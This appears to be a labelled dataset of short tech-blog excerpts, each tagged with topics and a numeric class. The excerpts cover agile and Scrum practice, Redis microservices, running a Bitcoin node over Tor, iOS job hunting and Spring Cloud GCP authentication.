3527,Software development has seen a huge change in the latest years and every day there is something new or noteworthy that is available in the industry. And as Moores Law suggests that: For sure the way we program software is heading toward change and evolution as usual. Frameworks and programming languages have changed already. I remember that there were no smartphone developers back in 2009 when I started a Software Engineering major and cloud was just something way ahead of adoption and still to grow. And almost every 6 months or so new framework or tool gets attention and people start using it.,"['Programming', 'Requirements']",16
3528,"NET MVC as my main framework. Now, I go with Angular which shows how much Java Script has evolved and still changing and still today the most dynamic language that can suit any changes. But, lets look at the way we develop software. I believe that needs to be changed to be more dynamic and able to respond to change much faster. Let me explain that the first major programming language was Fortran. And since then we have the same syntax almost used in every programming language. We use if and loops which in basic it is translated to CPU commands that move instructions to execute the programs.","['Programming', 'Requirements']",19
3529,"What I see today that we are still writing the code the same way we used to do many years ago. This is almost like that we are using 20th-century tools to develop programs. I know we came along way since the early days of programming and we have more powerful CPUs and a lot of RAM (Not enough for Google Chrome though!) but still, our own basic tool is still the same for a long time ago. Its time to do a change! Please note that as a programmer myself I intend to enhance people life rather than make money and make other fellow programmers out of work. Im open sourcing this work and it will be under CC license so we see the web 3.0 (Yes you read it right) and more powerful software. So we can enhance life on earth through software which became an important part of our life.","['Programming', 'Requirements']",16
3530,"I dont say that the current situation of the industry is bad, rather than imagine that we have two contractors. Each one has to build a 30 story building. One is working in the same traditional way. The other chose to build a 3D printer to print the whole thing. The first one is done in a year or so the other in 3 months or less. For sure the second one is more favorable than the first one. It does not mean that it is much better than the first one, rather than that it is much faster to gain results. I think we need to raise the bar (I know we already have enough Java Script frameworks!) again and enhance the process of development.","['Programming', 'Requirements']",12
3531,"The next articles will go in depth and introduce the basic semantic definitions. Also, to maintain quick results to be generated we will be using Azure Dev Ops and its work item to place our requirement their. Now for sure, you wonder what is the point of this? We want to have a central location for our requirement so we can manage it from a single place. Also, if you notice an error simply change the backlog or the user story and regenerate the code and you have your application updated with almost no human action pure high-level changes reflecting on the low-level requirement. A new column in a grid, just add it to the backlog and regenerate.","['Programming', 'Requirements']",8
3532,A quick disclaimer is in order. The first is that the approach Ill share in this post may not be a good fit for your projects. The approach Ill share here has been proven at Flywheel Sports and a host of other companies. I wrote an earlier post detailing why we built Hydra and the role it played in the building of our nation-wide live video streaming service.,"['Nodejs', 'Microservices', 'Redis', 'JavaScript', 'Engineering']",6
3533,Microservice presence can be managed using keys which auto-expire. Updating the key is done automatically by Hydra on behalf of the host service. Meaning its not something the developer does. Failure to update the key within 3 seconds results in the service being perceived as unavailable. That probably means the service isnt healthy.,"['Nodejs', 'Microservices', 'Redis', 'JavaScript', 'Engineering']",11
3534,"In this next example on the left, queuing a message is as simple as creating a UMF message and calling queue Message to send it. The code on the lower right shows the image processing service dequeuing a message by calling get Queued Message and later calling mark Queue Message once its processed the message. So to recap, sometimes, it isnt feasible to expect an immediate response. In those cases, we just need to queue work for later processing. The Redis List data structure can be used as a message queue. Commands like lpush and rpoplpush with atomic operations make this feasible. Here again, we saw how easy basic queuing can be using higher-level abstractions.","['Nodejs', 'Microservices', 'Redis', 'JavaScript', 'Engineering']",3
3535,"Distributed logging is another vital feature of any microservice architecture. However, if you know Redis you might be appalled at the thought of using it as a distributed logger. And youd probably be rightfully concerned. However, you could use it as a flight recorder. Where you only store the most serious errors and you limit the number of entries using lpush and ltrim. Then at least you would have a quick way of checking what might have gone wrong with your microservice.","['Nodejs', 'Microservices', 'Redis', 'JavaScript', 'Engineering']",11
3536,"Managing the configuration files for distributed microservices can be challenging. However, you can even use Redis to store configuration files for your services. We did this and it seemed like a good idea at the time. However, were starting to move away from it. As the core disadvantage is that storing configs in Redis makes Redis stateful and thats less than ideal. But this is possible, so Id like to share this with you.","['Nodejs', 'Microservices', 'Redis', 'JavaScript', 'Engineering']",11
3537,"The initiative has 4 epics defined. As you can see the MVP has stories from all these epics. Release 2 to 4 also have stories from several epics. The information that we need for the delivery planning is the following: The MVP has 7 stories at this point in time Release 2 has 8 stories identified Release 3 has 8 stories Release 4 has 6 stories The historical information that I need is: Team capacity: historical information on the number of items/stories that a team can finish per Sprint. I will use the following sample of the previous 10 Sprints: 2, 3, 4, 3, 2, 1, 1, 3, 2, 2The user story split rate: what is the chance that stories will be split once created? For the MVP I will use a split rate of 25%; history showed that every 4th story was split. For the remaining releases the split rate can rise to 50% taking into account user feedback and other expected insights changing the backlog.","['Agile', 'Scrum', 'Serious Scrum', 'Scrum And', 'Noestimates']",1
3538,I create the forecast use the Throughput forecaster from troy.magennis. It will take you 10 minutes at most to generate the forecast based on a Story Map and historical team data. I have written about the tool before: It is a brilliant tool that allows you to do forecasting based on estimates and historical data. It also allows you to plan on story points and on number of stories. I will not estimate my throughput and I also will not story-point-estimate. Hence I will be using the tool based on data only.,"['Agile', 'Scrum', 'Serious Scrum', 'Scrum And', 'Noestimates']",6
3539,"This is what it looks like: And this is the probabilistic forecast of the MVP: The results show that theres a:15% chance to deliver the MVP Dec 22nd 2018. This is very unlikely.65% chance to deliver the MVP Dec 29th 2018. This is possible, but it is a stretch. It is unsafe to communicate this date only.90% chance to deliver the MVP Jan 5th 2019. Theres a high chance that the MVP is ready by the date.95% chance to deliver the MVP Jan 12th 2019.almost 100% chance to deliver the MVP Jan 19th 2019. Theres no such thing as 100% certainty. The chance therefore is close to 100%.","['Agile', 'Scrum', 'Serious Scrum', 'Scrum And', 'Noestimates']",5
3540,Scrum is founded on empiricism: You might argue that delivery plans violate this notion of empiricism. How can you possibly look 4 months into the future? Actual data from the team that will be working on the initiative. Butwill the teams throughput remain unchanged for this new feature?will the teams split rate remain unchanged for this new feature?will the team remain unchanged? Hence I need to take this uncertainty into account when I communicate the delivery plan. It is a snapshot of a certain moment with the information that was available at that time.,"['Agile', 'Scrum', 'Serious Scrum', 'Scrum And', 'Noestimates']",1
3541,"This is great for a headless (no GUI) server where no fancy graphics or latest-and-greatest consumer applications are needed. That being said, you could use their newer, more frequently updated version. Just be aware that things might break But Bitcoin is known for its code stability, so it makes sense to run it on an OS that is also known for its code stability! To start, download the latest LTS version (currently 18.04LTS) from Ubuntus website: __url__ needed.","['Bitcoin', 'Cryptocurrency', 'Blockchain', 'Ubuntu', 'Tor']",10
3542,"Now we need to install Tor, which is simple on Ubuntu: Ensure that the following lines are (anywhere) in the Tor configuration file/usr/share/tor/tor-service-defaults-torrc: Control Port 9051Cookie Authentication 1Cookie Auth File Group Readable 1To view the default settings, use the command: If anyone of the above lines are missing, add them using the echo command as before, for example: If you had to add any of the above lines, be sure to restart the Tor service: In order to allow bitcoind access to the authentication that Tor uses, we have to add the user that runs bitcoind (the one you setup earlier while installing Ubuntu) to the Tor group (for me, I will put core where username is listed below, as thats the user I setup earlier): Now be sure to logout and back in to make sure group membership is updated (can also just restart the VM if you like). Once thats done, we are finally ready to launch Bitcoin over Tor! You can use the following command to monitor progress: It may take several days (or more) to download and initialize the entire blockchain. Once that completes, your node will be fully operational and can serve blocks to other nodes on the Tor network. Youll want to verify that IPv4 and IPv6 are set to false in the following command output to ensure you are operating ONLY over Tor: Once your node is fully synced and actively serving blocks to other nodes, you can run the following command to see if its doing so. If you see any true results, its working! Feel free to ask any questions or post about problems in the comments.","['Bitcoin', 'Cryptocurrency', 'Blockchain', 'Ubuntu', 'Tor']",7
3543,"One big lesson Ive learned is that a tools description might make it seem like it would to do exactly what is needed, but after further exploration, it is not flexible enough. The way to move forward from there is either to request the author for the new functionality or look for a different tool. Although there is no silver bullet for solving these problems, we can mitigate them early on. Here are a few quick things we could look out for ahead of time: Popularity: There is probably a good reason why so many developers are using the tool. It is a good indicator that it is flexible enough to fit a lot of different use-cases and that the maintainers are responsive enough to support all of these users. It doesnt mean that one tool which is more popular than another is always the better choice, but it is a good indicator. Different ecosystems have different ways of determining popularity. For instance, N __url__ has NPM package downloads and Python has Py PI statistics. Git Hub stars are also helpful, but it is not an accurate representation of how many people are using the tool.","['Open Source', 'Open Source Software', 'Guides And Tutorials']",19
3544,"There are many times when Ive run into roadblocks during my implementation where either the documentation was not very clear or I did not have enough of an understanding of the tool. In those cases, it is very helpful to reach out and ask for help. There are a few different options to explore: Stack Overflow: A simple google search using the name of the library and the feature you are trying to implement will usually point to a Stack Overflow post. It is the go-to place to get answers to issues you may be having. If you are not able to find the right answer, you can always ask a question yourself. Just make sure to be very detailed when asking a question.","['Open Source', 'Open Source Software', 'Guides And Tutorials']",9
3545,"Contributing to an Open Source software and displaying your work for the whole world to see and scrutinized may be scary for some people. I was certainly one of them. Having contributed anyway, I can say that the people scrutinizing your code are very friendly more often than not and they are just trying to help keep the quality of the tools they are using up to the highest standards. The perspective to take here is that we are all helping each other out to build awesome stuff. If you guys enjoyed reading this article, but feel like you need more details, please post a comment below. I am considering making this into a series where I go into more detail on each of the steps.","['Open Source', 'Open Source Software', 'Guides And Tutorials']",19
3546,"Modern UX design within an agile methodology revolves around informed design decisioning, user testing, analysing and iterating. The prototyping kit perfectly supports this approach but I quickly found we needed a launch page to anchor the alternative prototype versions (and their archived snapshots) along with any key design resources. Im sure this is standard practice for most designers working in this waybut planning for it from the outset impacts other structural and logic decisions later so its worth specific consideration from the outset. For instance, each of our distinct product directions is referred to as Service Model A, Service Model, B, etc. The design and prototype of each service model is iterated frequently and used extensively in user research. The whole prototype codebase is stored in Github and hosted on Heroku, with regular snapshots archived for easily accessing and browsing previous iterations (currently this is on an adhoc basis but conceivably could be tied more explicitly into an incremental user research plan). To minimise code and to ensure backwards stability of the snapshots whilst continually enhancing the latest version of each service model, its crucial to adopt a consistent URL structure. My approach is:domain/a/ __url__ (Service Model A latest)domain/a/181105/ __url__ (Service Model A snapshot)domain/b/ __url__ (Service Model B latest)Additionally, I have been pleasantly surprised at the impact the prototype launch page has had in acting as both a shop window and a visible, interactive status of our progress. From the early visualisation of ideas through to convincingly representing the end product, as designers we are often the lucky ones who get to materialise the efforts of many people.","['JavaScript', 'Govuk', 'Nunjucks', 'Prototyping', 'UX']",12
3547,"UK Design System is great for building page templates, understanding routing is crucial for effectively producing smart prototypes. I initially used routing for simply adding some rules to the page flows and, perhaps because Im so familiar using PHP to do web stuff, I kept trying to force too much logic into my Nunjucks templates. However, once I focussed my Nunjucks templates on handling purely presentational logic and moved any application logic into the routing, the separation quickly made more sense and I found myself spending more and more time in the __url__ file. However, referring back to our prototype launch page with a URL structure supporting multiple versions and snapshots, it soon became obvious that static routing wouldnt get me very far. With a bit of trial and error, and a little help from the Express documentation and a few (though not many) Stackoverflow threads, I arrived at a dynamic regex routing pattern that is flexible and robust, and now acts as the backbone to my prototype application logic. Each page route basically uses the following pattern: So now my launch page enables access to all the prototype versions and my super dynamic routing provides a flexible but powerful means of adding suitably separated logic. I need to push forward as quickly as possible with the latest Service Model without spending too much time fixing prototypes for broken previous models. The best way I found to handle this is to plan for it from the start (what proper professional developers might call defensive programming) by assuming that any piece of data might possibly be unavailable. I found this also happened frequently in deep-linking scenarios where I built the prototype to be relatively sequentialbuilding data as required to mimic the final systembut frequently being asked to send someone a link to a specific page.","['JavaScript', 'Govuk', 'Nunjucks', 'Prototyping', 'UX']",19
3548,"Using forms in page templates to consistently use post required me to utilise two HTML/CSS tricks quite frequently. Firstly, it quickly became apparent that I would need a means of posting from a form with a linksomething not supported by default in HTML. The trick here is to use an HTML button that is stripped of its button appearance, resulting in it looking like a link, the SASS for which is: Secondly, I then had a groan moment when I realised that Id have to find a hacky way of overriding the form action so that different links or buttons within a form could link to different URLs. Except, as it happens, its not hacky. Any submit button by default uses the action attribute defined on the form but it can be overridden by adding an attribute to the button itself: Note: It could be observed that adopting post and therefore using a form where it may not be essential conflicts with Tip 5 in that it leads to prototype pages which could be built differently to better represent the final production code. However, I would argue that, within reason, the outcome of creating more robust and smarter prototype pages results in a better informed solution anyway.","['JavaScript', 'Govuk', 'Nunjucks', 'Prototyping', 'UX']",19
3549,"PRs can either be merged or closed. There isnt a way within the pull request process for your reviewer to accept some commits and not others. Once your reviewer is happy with all the changes on your branch, they will merge it into the original branch you wanted to change. Congratulations, your changes are now done! Even though there are many steps required to make changes in Git, they all make sense once you know why they are necessary. Changing files locally on your computer lets you experiment and test your changes without confusing your reviewers. Adding files lets you group them into easily explainable atomic changes. Committing them lets you explain each group and creates your Git history. Pushing them puts them online where reviewers can see them. Opening a PR opens up a conversation about them with your reviewers. Finally, the merge gives your reviewers ultimate control over what changes get made to their projects, so they can make sure that nothing breaks.","['Git', 'Github', 'Version Control', 'Code', 'Technology']",18
3550,"The concept of a timebox can be traced back as far as to the late 80's. As it had been adopted by Extreme Programming (under the name of iteration) and Scrum (as sprint) it gained even more popularity and has become the essential part of applied Agile [1]. The power of this practice lies in the idea that instead of fixating on scope a team must focus on delivering as much value within a limited amount of time as possible. However, this essential meaning often gets overlooked. The very name of the concepta timeboxhints at how you should treat it: as a time span and as a bucket (a box) at the same time. Lets explore how these two aspects get misinterpreted and what thinking tool can help you to avoid misinterpretation.","['Agile', 'Scrum']",1
3551,"This mistake has its roots in traditional management that revolves around scope commitments as the primary tool for execution control. As soon as the scope for a project is defined and estimated, the commitment to delivering the scope is formed. The key focus now is fulfilling the commitment, i.e. delivering the scope before the estimated deadline, and if its not possible then the easiest way to fix this is to adjust the schedule. Im oversimplifying here, of course, as there are still options for de-scoping and playing with the team size. Nonetheless, in this paradigm completing full scope is considered the baseline to adjust from. And thats exactly what the concept of sprint (aka iteration or timebox) tries to turn upside down. This fact is aptly illustrated in the well-know diagram: The adverse effects of changing iteration length at will are quite dramatic.","['Agile', 'Scrum']",1
3552,"Lets take an astronomical hour as an example. You cant change the duration of an hour an hour is an hour by definition. Sprint should be regarded in the same way. Consider this analogy from your everyday life: if you need to mow a lawn but have only managed to do half of it in an hour, thats your result, no more and no less. You may still keep on mowing but all additional work will be happening during the next hour. What you do instead is you adjust your plans and priorities for the next hour and think of what were the reasons that you hadnt nailed it in your first attempt. You also get the understanding of your velocity: 0.5 lawns/hour. Thats exactly what a sprint is. It is the unit of time, not the amount of work you plan for it.","['Agile', 'Scrum']",4
3553,A team has completed a sprint but User Story X is still not finished. The team wants to visualize the progress theyve made on this story. On their task board they have a card for it. They rename it to User Story X Part 1 and move it to Done. They also create a card named User Story X Part 2 and put it in the next sprint. They dont manage to finish the story in the next sprint either. So they create User Story X Part 3 and now move Part 2 to Done. This exercise repeats itself a few more times.,"['Agile', 'Scrum']",1
3554,"First of all, it never actually shows real progress. Whether a user story is done or not can only be evaluated with the ultimate objective criterionis it live or not. In Scrum you can strengthen (or weaken) this criterion by the means of Definition of Done. This aligns with one of the Agile principles: working software is the primary measure of progress [3]. By cutting a user story into parts like shown in the example you are doing something as nonsensical as saying, Ive mowed half of the lawn, although I still dont know how big it is. How do you know then its a half and not a quarter? Second, such tracking removes the incentive of slicing user stories vertically into smaller pieces. Theres no pressure to have a story that you can truly complete in one sprint because you have a 100% guarantee to have a completed item at the end of each and every sprint.","['Agile', 'Scrum']",1
3555,"Kiryl Baranoshnik is an experienced Agile and Lean practitioner. He works as an Agile Coach for a large international software vendor and shares his knowledge publicly as an Agile trainer. If you want to learn more about Kiryl and the trainings he offers, check out his website and the schedule of the upcoming trainings. If you want to get the latest updates on Agile, Lean, and related topics, follow Kiryl on Linked In and Facebook.","['Agile', 'Scrum']",19
3556,"I am absolutely certain that at some point in your life you, or someone you know, has played an arcade racing game. One where you sit behind the wheel with pedals and a gear-stick. In my youth Daytona USA and Sega Rally were popular choices. The first time you played, ever, this is probably what happened: You put your foot on the accelerator and floored it. You handled the first couple of turns with ease. Slam on the breaks, spin the wheel, too late! Into the side of the mountain with you. It was pretty cool when you rolled. Youre not coming first anymore, though.","['Agile', 'Software Development', 'Pair Programming', 'Extreme Programming', 'Sustainable Pace']",5
3557,"If this is your team there are a couple of key things to address. It is likely you have optimized your work practices for velocity. Someone has probably said, or perhaps you yourself thought, we need to operate like an engine. A highly tuned, efficient machine where everyone has their own particular role to play. You have done this so you can go fast and its working. But what happens to an engine if a part breaks down? It can keep flying even if one of them breaks down.","['Agile', 'Software Development', 'Pair Programming', 'Extreme Programming', 'Sustainable Pace']",1
3558,"Also consider that the very term sprint implies a short term burst of activity and you should expect to feel tired at the end of it. Having a tired, exhausted team is the enemy of productivity. Start by aiming for a steady stream of digestible, achievable work. It is easily possible to arrange a regular cadence of team activity without actually sprinting. Have a retro every second Friday.","['Agile', 'Software Development', 'Pair Programming', 'Extreme Programming', 'Sustainable Pace']",1
3559,"If you have one day left before release, and one and a half days of workdevelopers will crunch. We wont sleep anyway if this is hanging over our heads. But well skip thoroughly testing some of the acceptance criteria. Or introduce some technical debt by leaving out some nice to have refactoring.","['Agile', 'Software Development', 'Pair Programming', 'Extreme Programming', 'Sustainable Pace']",13
3560,"The two pizza team is popular for a reason. Six to eight people is about the right number for an autonomous, cross-functional engineering team. Six developers will give you three working pairs, which is enough to get some decent work done. Specialism is fine, and encouraged, but pairing wont work if you have certain people who cant or wont touch certain parts of the system. Add in a delivery lead and sprinkle with an embedded tester or designer for a little extra flavor.","['Agile', 'Software Development', 'Pair Programming', 'Extreme Programming', 'Sustainable Pace']",1
3561,"The intention here is to eliminate knowledge silos. This should mean you never get caught in a situation where one person holds all the secrets. This is also referred to as bus factor. As in, how many people need to get hit by a bus before our project is in danger of failing? Pair programming on a feature without swaps will give you at least a bus factor of two. But you can do better than that by introducing rotations.","['Agile', 'Software Development', 'Pair Programming', 'Extreme Programming', 'Sustainable Pace']",13
3562,"It is hard to be prescriptive here because it is not possible to know in advance what will be slowing you down the most. The humble retrospective is probably your most powerful tool. Accept that things will not be perfect. Accept it will take time to adjust, time to get it right. Things you can try out next time, tweak, adjust.","['Agile', 'Software Development', 'Pair Programming', 'Extreme Programming', 'Sustainable Pace']",4
3563,"There is an Extreme Programming practice called sustainable pace. Its not just about eliminating overtime. We accepted things moved a little bit slower, accounted for that in our estimates and work continued. Product teams learnt to trust that we would deliver when we said we would and the software we built would just work.","['Agile', 'Software Development', 'Pair Programming', 'Extreme Programming', 'Sustainable Pace']",1
3564,"If we view software development as a marathon, not a sprint, achieving sustainable pace is practically cheating. Its like running that 400m track as a relay race. But what about the next 400m? A well-trained athlete will beat your relay team to the finish line, once. Meanwhile your team is still churning out software without pause.","['Agile', 'Software Development', 'Pair Programming', 'Extreme Programming', 'Sustainable Pace']",1
3565,"New mobile engineers often ask me how to get their first job. And the truth is: its really hard. If you just came out of a bootcamp or youre self-taught, youre not in demand. There are almost no junior positions publicly advertised. Everyone wants a Senior Engineer (or at least someone with a CS degree. It just takes time, tenacity, and careful planning.","['Job Hunting', 'Software Development', 'Software Engineering', 'iOS', 'Mobile App Development']",2
3566,"I myself have had a pretty charmed career and I dont have a CS degree. I actually come from the theatre world which is a far more brutal business. Actors say, It takes 100 auditions for every job. When youre a junior engineer, thats true for you, too, and the interviews are hard to come by. But after 12 years of solid experience, the number of interviews youll need will go down to 10. And then when youre more senior, youll have to turn off your Linked In notifications, youll have so many offers.","['Job Hunting', 'Software Development', 'Software Engineering', 'iOS', 'Mobile App Development']",2
3567,Do you have to do all these things? People have been hired without doing anything Ive put on this list. And a lot of the things Im going to recommend for the example app are actually kinda advanced or niche and not necessarily required by every job. But youre not in a position where just enough is acceptable. You need to out-shine all the other applicants. These optimizations will make your app look more impressive to a larger group of hiring managers (the people at companies that make the final decision to add you to their team).,"['Job Hunting', 'Software Development', 'Software Engineering', 'iOS', 'Mobile App Development']",0
3568,"Most of my career has been i OS and Flutter, but this good stuff should help any mobile engineer. (Although, I will use i OS examples here.) Will it lead to a job? I cant get you a job or even leads. You have to do that hard work for yourself. But do all this and youll probably have an easier time.","['Job Hunting', 'Software Development', 'Software Engineering', 'iOS', 'Mobile App Development']",2
3569,"Is this what you should do if youre applying to FAANG? Theres already a lot written about applying to major tech companies (and companies that mimic their formal processes). As someone without a CS degree, your best bets for work are at agencies and startups (companies that often prize applied skills over theoretical knowledge. )If you want to work at the big companies, thats possible! I have and I was in your position once. Look on the career websites of those companies for information on that. Just know, its a whole other ballgame.","['Job Hunting', 'Software Development', 'Software Engineering', 'iOS', 'Mobile App Development']",2
3570,"Dont try to be clever on this one. Its literally supposed to be derivative.1: It has to be pretty99% of mobile jobs are on the front-end. You will spend 99% of your time working on the part of the app that people see. You need to show employers you can deliver them something polished and design-aware. In fact, a lot of time, youll be working closer to your teams designer than any other non-engineer.","['Job Hunting', 'Software Development', 'Software Engineering', 'iOS', 'Mobile App Development']",12
3571,Some will say that a beautiful layout isnt scannable by resume scanning systems. Thats not a concern for you. Youre not gonna get work at the biggest companies. Your best chances for work are at digital agencies and startups. They dont use Applicant Tracking Systems. They may not even have HR people.,"['Job Hunting', 'Software Development', 'Software Engineering', 'iOS', 'Mobile App Development']",0
3572,"Some recruiters will tell you to give them an all-text Word document version. They want that so they can replace your information with theirs. Do it if you think they can get you work. But most recruiters are useless to junior engineers. Companies that use them or contract with them are usually looking for experienced, trusted, senior engineers to bring a good return on that investment, not juniors.","['Job Hunting', 'Software Development', 'Software Engineering', 'iOS', 'Mobile App Development']",0
3573,"Also, dont accept a position where youre the only engineer of your kind. You dont know what youre doing yet! Some sketchy people are desperate and will offer you a solo role. You need to work under someone experienced. Thats the whole point of the first job.2: Keep it short1 page. You arent supposed to have a long resume. If youre coming in for a junior position and you have a long resume, theyll be like, Their resume is so long. Should you put your projects / homework from bootcamp or school? If they are done for a class and everyone else is building the same thing, they dont count and they junk up your resume. But do put that you had education at a bootcamp or vocational program and list the technologies you studied. And I mean literally list i OS: Core Data, Core Animation, Objective-C, Swift, Sprite Kit.","['Job Hunting', 'Software Development', 'Software Engineering', 'iOS', 'Mobile App Development']",2
3574,"Should you put your college / degree? Even if its in music theatre. (Its always a good conversation starter.) Even if you didnt finish it. (You can just put the years if its incomplete.) Even if its at an off-shore, unaccredited, correspondence college. (No one cares where you went unless its Stanford, MIT, Yale, Harvard, or the college they went to. 3.95+Put a section with special skills, volunteering, interests, or just more information about you as a person. You want good conversation starters in that section. Hopefully someone who sees it will also have those interests or at least wanna know more.3: Linked In, Git Hub, Stack Overflow You need to have professional looking and sounding profiles on all public platforms. That means a clear friendly headshot where we can see your eyes (not a sultry pic or one of you with sunglasses mountain climbing.) Prolific Interactive (a digital agency in Brooklyn) does a great job with theirs. For job searches, look into the camera and smile at least a little. Save the silly shot for your introduction email to your new i OS team later.","['Job Hunting', 'Software Development', 'Software Engineering', 'iOS', 'Mobile App Development']",2
3575,"Was it the next big thing? There are lots of ways people get that information if they want it. In fact, this app probably only had a handful of downloads ever. Its just proof to employers that you can do this job.","['Job Hunting', 'Software Development', 'Software Engineering', 'iOS', 'Mobile App Development']",17
3576,"JSON API HTTP calls Your app has to talk to the internet. That was what I learned in my first rejection many years ago. What it talks to is up to you. You can have a custom backend that you or a friend built. Or use a publicly available service. Doesnt matter as long as its showing HTTP calls. That means Cloud Kit and Firebase dont count. (You can still use out-of-the-box backends like Cloud Kit and Firebase but include, somewhere, a couple calls to an HTTP service to show you know how.) It also doesnt matter if you do it the hard way with NSURLSession or with a networking package like Alamo Fire; they both require you to show basic understanding of HTTP methods, JSON decoding, and blocks.","['Job Hunting', 'Software Development', 'Software Engineering', 'iOS', 'Mobile App Development']",11
3577,"MVC (The basics)Apple sets up the V and the C for you. (Youd have to go out of your way to mess it up.) And when it comes to the M, you want to show you can keep the model out of the controller: dont put your API calls in the view controller. Abstract the model into its own type and have a manager type that handles the model and the API calls. So, if your app is selling milk, maybe you have a Milk Manager thats a singleton and a method for buying x number of Cartons with a success block and a fail block. Theres a million examples of this out there for inspiration. (BTW: This is just one way to do this and its only scratching the surface of MVC. Sadly, almost no students come out of bootcamp knowing any way to encapsulate and isolate the different layers of an app.) But its used slightly less than MVC and might be easier to learn after you understand MVC. Since this is a harder concept to explain quickly, Ive created a sample app you can see in my Git Hub repo that illustrates what I mean about basic MVC. Could you do dependency injection instead of a singleton? Absolutely, and be sure to mention that you did. Its a $50 word for a 25 concept. In the end, it just matters you keep things organized by purpose as much as possible.","['Job Hunting', 'Software Development', 'Software Engineering', 'iOS', 'Mobile App Development']",15
3578,"Formatting / Style Guide Style guides are formatting guidelines for code. They make your code more readable and much prettier. Be sure all your code is formatted according to a style guide. Dont come up with your own style guide. Use one of the published ones like Googles Objective-C style guide and Ray Wenderlichs Swift style guide. But dont try to read them. Just run command line tools that format your code for you. Ive included a slightly modified version of the script we use in Material Components for i OS in my Git Hub repo. If you run it from the root of your project (`.format_all.sh`), it will go thru and reformat all your Objective-C and Swift code using clang-format and swiftlint. (i OS-Specific note: Also make sure that all your IBActions for buttons end with Did Touch: like submit Did Touch: or cancel Did Touch. )Rotation Support both portrait and landscape in your app. Its not very hard (especially with Auto Layout). Heres a tutorial on doing it in storyboards and heres one for programmatic layout.","['Job Hunting', 'Software Development', 'Software Engineering', 'iOS', 'Mobile App Development']",18
3579,"Minimum Contrast Ratio Another easy win in A11y is making sure your content has a minimum contrast ratio to its background. That means making sure things like text and icons are much brighter or much darker than whatever they are in front of. (The luminance to luminance ratio of colors is called the contrast ratio. You can read all about it in the Material Design guidelines.) You want small text and iconography, like body text and system icons, to have a 4.5:1 ratio and large text, like titles, to have 3:1. Ex: youre probably reading this body text as 84% black text on a white background. According to contrast-ratio.com, thats a ratio of 14.58 which passes! You can learn more on using __url__ in this Boring Development Show episode. tl;dr Make sure people can easily see everything in your app, measure it to be sure, and then you have something else to show off when youre walking through your app with a potential employer.","['Job Hunting', 'Software Development', 'Software Engineering', 'iOS', 'Mobile App Development']",14
3580,"Programmatic Layout (Some)Not all UI is built with storyboards and nibs/xibs. (BTW: the part of Xcode that lets you edit those files in a wysiwig manner is called Interface Builder which used to be a separate application from Xcode.) At large companies, almost no UI is built with Interface Builder. As your team grows, it becomes easier to maintain programmatic UI. Put in something that is programmatic. Maybe a UITable View Cell subclass thats all programmatic layout or a modal. Ive included a programmatically added label in the example program. (Dont forget to turn off translates Autoresizing Mask Into Constraints on your programmatically-added views in Auto Layout! )No Warnings Make sure Xcode is serving no yellow warnings in the Issue Navigator except for ones having to do with the build settings from Cocoa Pods. (You cant do anything about those.) And I dont mean for you to turn off the warnings. You need to resolve all the issues they present even if they are no big deal. For each of those issues, theres an engineer who cares deeply about it. You dont wanna be showing your app to them while you still havent fixed it.","['Job Hunting', 'Software Development', 'Software Engineering', 'iOS', 'Mobile App Development']",18
3581,Tablet An easy win is making your app universal (supporting both i Phone and i Pad.) This is a lot like supporting rotations. You can do it almost exclusively through Auto Layout in storyboards. Just make sure it looks good and makes sense. Your UI should change with the new form factor. The same tutorial that is helpful with rotations will help you with supporting i Pad.,"['Job Hunting', 'Software Development', 'Software Engineering', 'iOS', 'Mobile App Development']",19
3582,"Documentation and Comments Make sure youve documented all of your new code (ie: Objective-C headers and Swift apis you wrote yourself). This includes classes, protocols, interfaces, extensions, categories, properties, constants, methods, and functions. Read your platforms system header documentation for examples of how to write, what to document, and syntax. Documenting your code provides two benefits: your interviewers will understand your code better (and know that you do as well), and you can occasionally find bugs or think of better ways to do something. If its hard to describe what a piece of code does succinctly, you may find it easier to break it up. Bonus: there are tools that read your codes documentation and turn it into great reference docs or sites. See this article on Doxygen by Ibrahim Ulukaya to learn about one of them.","['Job Hunting', 'Software Development', 'Software Engineering', 'iOS', 'Mobile App Development']",19
3583,"Git If you dont know anything about git, read Kevin Millers article on git for beginners. Make sure your project is in a git repository that is saved to a remote service like Git Hub or Bit Bucket. This will not only show your potential employers that you have a basic understanding of git, it will give you a way to distribute your code to recruiters and hiring managers. You also want a good.gitignore file. (The easiest way is to allow Xcode to initialize a git repo for you when you make your project but you can also find good.gitignore files on Git Hub.) And dont check in your /Pods directory.","['Job Hunting', 'Software Development', 'Software Engineering', 'iOS', 'Mobile App Development']",18
3584,"Bonus: Simple data persistence (if possible)If your project would benefit from it, its impressive to have data persistence. Especially if you save the data to files. Out-of-the-box solutions (Realm, NSUser Defaults, etc) are intended to be easy-to-adopt. But thats ok; use them if you need to. Theres nothing wrong with them per se even if they are a little less impressive. Its far too powerful for whatever you come up with. Heres a tutorial from Ray Wenderlich on archiving to disk.","['Job Hunting', 'Software Development', 'Software Engineering', 'iOS', 'Mobile App Development']",8
3585,"Bonus: Cross-platform project Cross-platform tools are more powerful and impressive than ever. Try your hand at a simple Flutter or React Native project. Heres a series of codelabs on Flutter. :)This is a lot to do. But each thing in this article sets you apart from another candidate in the very competitive world of junior mobile dev. Do as much as you can, be tenacious, and get that job.","['Job Hunting', 'Software Development', 'Software Engineering', 'iOS', 'Mobile App Development']",19
3586,"Now there are two basic ways of authenticating your Spring Cloud GCP app with a service account key file. The first one is to add the full path to the key file to the GOOGLE_APPLICATION_CREDENTIALS environment variable: The second (and my personal favorite, since you do not need to store the actual file anywhere) is to make the appropriate Spring properties contain you key file info. To do that, you need to encode your key file into Base64 format. Now you can either use an app such as Base64E __url__ to help you with that or use your own OS's tools. For instance, in Linux systems: Now whatever tool you use, just make sure you copy the result and add to your project's application.properties file as: You can also store your encoded key file in an environment variable. Just need to change your application.properties to get the credentials property from it: And that is it! Just run./gradlew clean build once again in your root directory and you should see a beautiful BUILD SUCCESSFUL message.","['Google Cloud Platform', 'Spring', 'Spring Boot', 'Pub Sub', 'Java']",7
3587,"A private cloud is the opposite of a public cloud. Services offered in a private cloud are typically consumed by a single organization. The infrastructure can be located either on-premise or in a data center owned and operated by a service provider. The provider of the private cloud service is the IT department. It is also possible that the cloud management is outsourced to a vendor while the IT department handles the governance. A private cloud, in most cases, exists in large organizations that have frequent demands for new IT services. Organizations with a lot of software developers are use cases for private cloud, as developers have frequent requests for new virtual machines.","['Cloud Computing', 'Azure', 'Microsoft', 'Cloud', 'Microservices']",11
